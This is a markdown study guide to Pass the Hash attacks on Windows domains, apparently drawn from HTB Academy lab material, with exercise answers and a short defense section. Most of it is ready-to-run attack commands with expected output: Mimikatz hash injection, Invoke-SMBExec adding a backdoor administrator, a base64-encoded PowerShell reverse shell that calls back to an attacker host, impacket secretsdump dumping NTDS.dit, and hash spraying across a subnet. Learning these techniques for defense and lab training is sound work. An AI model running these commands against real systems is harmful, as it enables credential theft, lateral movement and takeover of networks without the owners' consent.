# Pass the Hash (PtH) Attacks

## 🎯 Overview

**Pass the Hash (PtH)** is a lateral movement technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password, exploiting the NTLM authentication protocol where password hashes remain static until the password is changed.

> **"PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed."**

## 🧠 Windows NTLM Authentication Protocol

### NTLM Overview
**Microsoft's Windows New Technology LAN Manager (NTLM)** is a set of security protocols that:
- Authenticates users' identities  
- Protects data integrity and confidentiality
- Provides Single Sign-On (SSO) functionality
- Uses challenge-response protocol for verification

### NTLM Vulnerabilities
```bash
# Key weaknesses exploited in PtH attacks:
1. Passwords stored without salt on servers/domain controllers
2. Password hashes remain static between password changes  
3. Hash can be used directly for authentication
4. Legacy compatibility requirements keep NTLM active
5. Challenge-response doesn't validate hash freshness
```

### Hash Acquisition Methods
```bash
# Common methods to obtain NTLM hashes:
1. Local SAM database dumping (compromised host)
2. NTDS.dit extraction (Domain Controller)  
3. LSASS memory dumping (running processes)
4. Network traffic interception (relay attacks)
5. Credential dumping tools (Mimikatz, secretsdump)
```

## 🪟 Windows-Based Pass the Hash Attacks

### 1. Mimikatz - sekurlsa::pth Module

#### Basic Mimikatz PtH Syntax
```cmd
# Required parameters for sekurlsa::pth
/user     - Username to impersonate
/rc4      - NTLM hash (also accepts /NTLM)  
/domain   - Domain (use computer name, localhost, or . for local accounts)
/run      - Program to execute (defaults to cmd.exe)
```

#### Mimikatz PtH Execution
```cmd
# Example: Pass the Hash for user julio
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

# Expected output:
# user    : julio
# domain  : inlanefreight.htb  
# program : cmd.exe
# NTLM    : 64F12CDDAA88057E06A81B54E73B949B
# |  PID  8404
# \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
# \_ kerberos - data copy @ 0000028FC964F288
```

#### Post-Exploitation with Mimikatz
```cmd
# After Mimikatz PtH, use the spawned cmd.exe for:
net use \\DC01\julio /persistent:no
dir \\DC01\julio
type \\DC01\julio\file.txt

# Test network connectivity
ping DC01
net view \\DC01
```

### 2. Invoke-TheHash - PowerShell PtH Framework

#### Invoke-TheHash Overview
- **Collection of PowerShell functions** for PtH attacks
- **WMI and SMB execution** methods available  
- **.NET TCPClient** for network connections
- **NTLMv2 authentication** protocol implementation
- **No local admin required** (client-side)

#### Required Parameters
```powershell
# Core parameters for Invoke-TheHash
-Target    # Hostname or IP address
-Username  # Username for authentication  
-Domain    # Domain (optional with @domain suffix)
-Hash      # NTLM hash (LM:NTLM or NTLM format)
-Command   # Command to execute (optional)
```

#### SMB Method with Invoke-TheHash
```powershell
# Import Invoke-TheHash module
Import-Module .\Invoke-TheHash.psd1

# Create new user with administrative rights
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Expected output:
# VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
# VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege
# VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
# [+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
```

#### WMI Method with Reverse Shell
```powershell
# Step 1: Start Netcat listener
.\nc.exe -lvnp 8001

# Step 2: Generate PowerShell reverse shell (revshells.com)
# Use PowerShell #3 (Base64) with your IP and port

# Step 3: Execute reverse shell via WMI
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# Result: Reverse shell connection from target
```

## 🐧 Linux-Based Pass the Hash Attacks

### 1. Impacket PtH Tools

#### impacket-psexec
```bash
# Basic PsExec with hash  
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# Expected output:
# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
# [*] Requesting shares on 10.129.201.126.....
# [*] Found writable share ADMIN$
# [*] Uploading file SLUBMRXK.exe
# [*] Opening SVCManager on 10.129.201.126.....
# [*] Creating service AdzX on 10.129.201.126.....
# [*] Starting service AdzX.....
# Microsoft Windows [Version 10.0.19044.1415]
# C:\Windows\system32>
```

#### Other Impacket PtH Tools
```bash
# WMI command execution
impacket-wmiexec administrator@TARGET -hashes :NTHASH

# Scheduled task execution  
impacket-atexec administrator@TARGET -hashes :NTHASH

# SMB command execution
impacket-smbexec administrator@TARGET -hashes :NTHASH

# Domain controller replication (secretsdump)
impacket-secretsdump domain/user@TARGET -hashes :NTHASH
```

#### Advanced PtH + VSS Extraction
**Scenario**: Use existing compromised hash to extract additional credentials via Volume Shadow Copy
```bash
# Use PtH with VSS to dump NTDS.dit and SYSTEM registry
impacket-secretsdump -hashes :30B3783CE2ABF1AF70F77D0660CF3453 administrator@10.129.206.60 -use-vss

# Alternative: Specify domain context  
impacket-secretsdump -hashes :NTHASH domain.local/administrator@TARGET -use-vss

# Extract specific user hashes only
impacket-secretsdump -hashes :NTHASH administrator@TARGET -use-vss -just-dc-user krbtgt

# Output to file for offline analysis
impacket-secretsdump -hashes :NTHASH administrator@TARGET -use-vss -outputfile domain_hashes
```

**Why VSS + PtH is Powerful:**
- **No LSASS dumping** - VSS reads from disk, avoiding memory detection
- **Complete domain dump** - Extract all domain user hashes at once  
- **Stealth extraction** - Uses legitimate Windows VSS service
- **Hash chaining** - Use one hash to get hundreds more

**VSS Requirements:**
- Administrator/Local Admin privileges
- Target must be Domain Controller
- VSS service enabled (default on Windows Server)
- Sufficient disk space for shadow copy

### 2. NetExec (CrackMapExec) PtH Attacks

#### Basic NetExec PtH
```bash
# Single target authentication test
netexec smb 172.16.1.10 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Network range spray attack
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Expected output:
# SMB    172.16.1.5    445    MS01    [*] Windows 10.0 Build 19041 x64 (name:MS01)
# SMB    172.16.1.5    445    MS01    [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

#### NetExec Command Execution
```bash
# Execute commands with PtH
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

# Local authentication method
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth

# Results:
# SMB    10.129.201.126  445    MS01    [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
# SMB    10.129.201.126  445    MS01    [+] Executed command
# SMB    10.129.201.126  445    MS01    MS01\administrator
```

### 3. Evil-WinRM PtH

#### Basic Evil-WinRM Usage
```bash
# PowerShell remoting with hash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# Domain account format
evil-winrm -i TARGET_IP -u administrator@inlanefreight.htb -H NTHASH

# Expected result:
# Evil-WinRM shell v3.3
# Info: Establishing connection to remote endpoint
# *Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Evil-WinRM Post-Exploitation
```powershell
# File upload/download
upload local_file.txt
download remote_file.txt

# PowerShell command execution
Get-ChildItem
whoami /all
net user
```

## 🖥️ RDP Pass the Hash Attacks

### Prerequisites for RDP PtH
**Restricted Admin Mode** must be enabled on target host.

#### Enable Restricted Admin Mode
```cmd
# Add registry key to enable RDP PtH
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Registry path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
# Value: DisableRestrictedAdmin = 0 (DWORD)
```

#### RDP PtH with xfreerdp
```bash
# Connect using hash instead of password
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

# Expected connection with GUI access
# Desktop environment available for interactive operations
```

## 🛡️ UAC and PtH Limitations

### Local Account Token Filter Policy
```cmd
# UAC limitations for local accounts
Registry Key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy

Value 0 (Default): Only built-in Administrator (RID-500) can perform remote admin
Value 1: All local administrators can perform remote admin

# FilterAdministratorToken exception
Registry Key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
Value 1: Even RID-500 Administrator enrolled in UAC protection
```

### Domain vs Local Account Differences
```bash
# Domain accounts (No UAC limitations)
✅ Full PtH capability against domain-joined machines
✅ Administrative rights preserved across network
✅ No token filtering restrictions

# Local accounts (UAC limitations)
⚠️ Limited to RID-500 Administrator by default
⚠️ Other local admins blocked unless policy changed
⚠️ Token filtering prevents remote operations
```

## 🎯 HTB Academy Lab Exercises

### Lab Environment
- **Target Systems**: MS01 (Windows client) and DC01 (Domain Controller)
- **Access**: MS01 with tools in `C:\tools` directory
- **Hash Example**: Administrator `30B3783CE2ABF1AF70F77D0660CF3453`
- **Domain**: inlanefreight.htb

### Exercise 1: Basic PtH Access
**Objective**: Access target using Pass-the-Hash and read `C:\pth.txt`
```bash
# Method 1: Using Impacket
impacket-psexec administrator@TARGET_IP -hashes :30B3783CE2ABF1AF70F77D0660CF3453
type C:\pth.txt

# Method 2: Using NetExec
netexec smb TARGET_IP -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -x "type C:\pth.txt"

# Method 3: Using Evil-WinRM
evil-winrm -i TARGET_IP -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
Get-Content C:\pth.txt
```

### Exercise 2: RDP Registry Configuration
**Objective**: Identify and configure registry value for RDP PtH
```cmd
# Answer: DisableRestrictedAdmin
# Location: HKLM\System\CurrentControlSet\Control\Lsa
# Value: 0 (DWORD)

# Enable RDP PtH
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Connect via RDP with hash
xfreerdp /v:TARGET_IP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

### Exercise 3: Hash Extraction with Mimikatz
**Objective**: Extract David's NTLM hash from current session
```cmd
# Connect via RDP with Administrator
# Navigate to C:\tools and run Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Look for David's account NTLM hash
# Extract RC4/NTLM hash value
```

### Exercise 4: Share Access with David's Hash
**Objective**: Use David's hash to access `\\DC01\david` share
```cmd
# Method 1: Using Mimikatz PtH
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:DAVID_HASH /domain:inlanefreight.htb /run:cmd.exe" exit
net use \\DC01\david
type \\DC01\david\david.txt

# Method 2: From Linux using Impacket  
impacket-smbclient inlanefreight.htb/david@DC01 -hashes :DAVID_HASH
shares
use david
ls
get david.txt
```

### Exercise 5: Julio Share Access
**Objective**: Use Julio's hash to access `\\DC01\julio` share
```cmd
# Extract Julio's hash from Mimikatz output
# Use hash: 64F12CDDAA88057E06A81B54E73B949B

# Access share
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
net use \\DC01\julio
type \\DC01\julio\julio.txt
```

### Exercise 6: Reverse Shell with Invoke-TheHash
**Objective**: Create reverse shell from DC01 to MS01 using Julio's hash
```powershell
# Step 1: Start Netcat listener on MS01
C:\tools\nc.exe -lvnp 8001

# Step 2: Import Invoke-TheHash
Import-Module C:\tools\Invoke-TheHash\Invoke-TheHash.psd1

# Step 3: Generate reverse shell command (revshells.com)
# PowerShell #3 (Base64) targeting MS01 IP

# Step 4: Execute reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "BASE64_ENCODED_POWERSHELL_COMMAND"

# Step 5: Access flag file
Get-Content C:\julio\flag.txt
```

### Optional Exercise: Remote Management Users
**Objective**: Test john's account with Remote Management Users membership
```bash
# Test with Impacket (should fail - wrong protocol)
impacket-psexec inlanefreight.htb/john@MS01 -hashes :JOHN_HASH
# Result: Access denied (SMB not allowed)

# Test with Evil-WinRM (should succeed)
evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
# Result: Successful PowerShell session (WinRM allowed)
```

## 📋 Pass the Hash Methodology

### Pre-Attack Requirements
```bash
# Hash acquisition methods
1. Local SAM database dumping
2. NTDS.dit extraction from Domain Controller
3. LSASS memory dumping
4. Network traffic interception
5. Credential dumping with Mimikatz/secretsdump
```

### Attack Decision Matrix
```bash
# Windows environment (internal access)
✅ Mimikatz sekurlsa::pth - Direct hash injection
✅ Invoke-TheHash - PowerShell framework
✅ Built-in Windows tools integration

# Linux environment (remote access)
✅ Impacket suite - Multiple execution methods
✅ NetExec - Network-wide hash spraying
✅ Evil-WinRM - PowerShell remoting

# GUI access required
✅ xfreerdp with /pth - RDP with hash
✅ Requires DisableRestrictedAdmin = 0
```

### Execution Method Selection
```bash
# SMB execution (psexec, smbexec)
- Service creation and management
- Requires ADMIN$ share access
- Firewall-friendly (port 445)

# WMI execution (wmiexec)  
- Windows Management Instrumentation
- Requires DCOM permissions
- Stealthier than SMB methods

# PowerShell remoting (Evil-WinRM)
- Requires WinRM service enabled
- Remote Management Users membership
- Interactive PowerShell session

# RDP access (xfreerdp)
- Full GUI desktop access
- Requires Restricted Admin Mode
- Registry modification needed
```

## 🛡️ Detection and Defense

### Detection Indicators
```bash
# Network-based detection
- Multiple NTLM authentication attempts
- Unusual source IPs for administrative accounts
- Cross-subnet administrative activity
- Service creation/deletion patterns

# Host-based detection
- Abnormal process spawning patterns
- Registry modifications (DisableRestrictedAdmin)
- Unusual PowerShell execution
- Administrative tool usage from non-admin systems
```

### Defense Recommendations
```bash
# Authentication hardening
✅ Implement LAPS for local administrator passwords
✅ Disable NTLM where possible (use Kerberos)
✅ Enable Protected Process Light for LSASS
✅ Regular password rotation policies

# Network segmentation
✅ Limit administrative account network access
✅ Implement privileged access workstations (PAWs)
✅ Network access control (802.1X)
✅ Micro-segmentation for critical assets

# Monitoring and logging
✅ Monitor event ID 4624 (successful logons)
✅ Track service creation (event ID 7045)
✅ PowerShell script block logging
✅ Sysmon for detailed process monitoring
```

## 💡 Key Takeaways

1. **NTLM weakness** - Hash reuse without salt makes PtH possible
2. **Multi-platform attacks** - Both Windows and Linux tools available
3. **UAC limitations** - Local accounts restricted, domain accounts privileged
4. **Registry dependencies** - RDP PtH requires DisableRestrictedAdmin modification
5. **Protocol diversity** - SMB, WMI, WinRM, RDP all support hash authentication
6. **Network impact** - Single hash can compromise multiple systems
7. **Detection challenges** - Legitimate authentication protocols exploited
8. **Defense strategy** - LAPS, Kerberos, and network segmentation critical

---

*This comprehensive guide covers Pass the Hash attack techniques using Windows and Linux tools, based on HTB Academy's Password Attacks module.* 